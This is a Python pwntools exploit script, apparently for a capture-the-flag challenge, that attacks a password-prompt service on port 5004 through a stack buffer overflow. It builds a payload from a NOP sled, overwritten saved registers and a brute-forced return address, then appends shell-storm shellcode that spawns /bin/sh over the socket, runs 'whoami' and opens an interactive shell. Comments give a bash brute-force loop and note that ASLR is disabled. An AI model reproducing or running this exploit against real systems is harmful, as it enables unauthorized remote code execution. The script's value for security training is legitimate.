#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys
from pwn import *
from struct import pack, unpack

# ebp
MAGIC_EBP = 0xffffcf78
#MAGIC_EBP = 0xffffc118

# padding
MAGIC_LENGTH = 32

# retval
MAGIC_RETVAL = 0x303036F4 # some useless place

print(MAGIC_RETVAL)

# The answer is that for every program the stack will
# start at the same address.  Most programs do not push more than a few hundred
# or a few thousand bytes into the stack at any one time.  Therefore by knowing
# where the stack starts we can try to guess where the buffer we are trying to
# overflow will be.  Here is a little program that will print its stack
# pointer:


#ulimit -c unlimited
#gdb-multiarch
#sudo sysctl -w kernel.randomize_va_space=0

# shellcode, bytes: 5
# xor eax, eax
# inc eax
# int 0x80
exit_shellcode="\x31\xc0\x40\xcd\x80"

if "remote" in sys.argv[1:]:
    conn = remote("192.168.50.3", 5004)
else:
    conn = remote("localhost", 5004)

recieved = conn.recvuntil("Password: ")
log.info("Recieved password prompt")
log.info("Sending payload")

# gdb b * 0x30303716
# patch
# sigpipe
MAGIC_EBX = 0x4 
MAGIC_ESI = 0x3
MAGIC_EDI = 0xa
#MAGIC_EBP#ebp 0xffffcf88
#gdb-multiarch

################
### PAYLOADS ###
################

RETVAL = int(sys.argv[2],16)
print(hex(RETVAL))
# On my own PC:
# 0xffffed40 - 0xffffddc0 = 0xF80
# ./4hack.py local 0xffffed40 -3900

# After reviewing smashing the stack, figure out direction of stack
#{{what ever happened to fred durst?}}
# On the remote black box:
# Brute force:
# for i in $(seq -200 0); do echo "index: $i offset: $(($i*100))"; eval "./4hack.py remote 0xffffed40 $(($i*100))"; sleep 2s; done > log.txt
# jz@snowy:~/9447$ ./4hack.py remote 0xffffed40 -4000
RETVAL = RETVAL + int(sys.argv[3])

# http://shell-storm.org/shellcode/files/shellcode-881.php
shellcode = "\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

#shellcode = "\x31\xc0\xbb\x04\x00\x00\x00\x31\xc9\xb0\x3f\xcd\x80\x31\xc0\xbb\x04\x00\x00\x00\x41\xb0\x3f\xcd\x80\x31\xc0\xbb\x04\x00\x00\x00\x41\xb0\x3f\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
payload = "\x90" * MAGIC_LENGTH + str(p32(MAGIC_EBX)) + str(p32(MAGIC_ESI)) + str(p32(MAGIC_EDI)) + str(p32(MAGIC_EBP)) + str(p32(RETVAL))  + "\x90" * 200 + shellcode

#print(payload)

#print("Nop sled is " + str(MAGIC_LENGTH-len(shellcode)) + " long")

conn.sendline(payload)

#conn.sendline("lsb_release -a")
#print conn.recv()
#conn.sendline("ls")
#print conn.recv()
conn.sendline("whoami")
print conn.recv()

conn.interactive()
